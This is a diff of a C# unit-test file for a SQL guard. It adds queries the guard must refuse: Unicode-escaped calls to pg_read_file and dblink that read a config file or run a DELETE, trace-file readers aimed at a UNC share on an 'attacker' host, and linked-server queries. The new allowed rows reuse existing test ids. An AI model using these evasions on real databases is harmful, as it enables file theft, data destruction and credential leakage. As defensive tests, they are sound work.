@@ -86,6 +86,12 @@ public sealed class QueryDatabaseTests : IDisposable
         [InlineData("h60", "mysql", "SELECT 1-- INTO OUTFILE 'C:/probe/out/nbsp.txt'")]
         [InlineData("h61", "sqlserver", "SELECT 1e0DELETE canary")]
         [InlineData("h62", "sqlserver", "EXEC [app].sp_help")]
+        [InlineData("h63", "postgres", "SELECT U&\"\\0070g_read_file\"('postgresql.conf')")]
+        [InlineData("h64", "postgres", "SELECT u&\"!0064blink\" UESCAPE '!'('host=x', 'DELETE FROM canary')")]
+        [InlineData("h65", "sqlserver", "SELECT * FROM sys.fn_trace_gettable('\\\\attacker\\s\\a.trc', default)")]
+        [InlineData("h66", "sqlserver", "SELECT * FROM sys.fn_xe_file_target_read_file('\\\\attacker\\s\\*.xel', NULL, NULL, NULL)")]
+        [InlineData("h67", "sqlserver", "SELECT * FROM [prodsrv].[sales].[dbo].[orders]")]
+        [InlineData("h68", "sqlserver", "SELECT * FROM prodsrv.sales..orders")]
     public void AnAttemptToWriteOrActBeyondTheDatabase_IsRefusedByTheAnalysis(string id, string engine, string sql) =>
         Assert.True(SqlGuard.Refusal(sql, Engine(engine)) is not null, $"{id} passed the analysis: {sql}");
 
@@ -126,6 +132,8 @@ public sealed class QueryDatabaseTests : IDisposable
         [InlineData("l25", "sqlserver", "EXEC sp_help 'canary'")]
         [InlineData("l26", "sqlserver", "EXEC sp_columns @table_name = N'canary'")]
         [InlineData("l27", "sqlserver", "sp_helpindex 'canary'")]
+        [InlineData("l28", "sqlserver", "SELECT TOP 5 o.[OrderID] FROM [Northwind].[dbo].[Orders] o")]
+        [InlineData("l29", "postgres", "SELECT \"U&x\" FROM \"orders\" LIMIT 1")]
         [InlineData("l28", "sqlserver", "SELECT 1 AS a SELECT 2 AS b")]
         [InlineData("l29", "postgres", "SHOW work_mem")]
         [InlineData("l30", "postgres", "SELECT pg_get_constraintdef(oid) FROM pg_constraint LIMIT 3")]
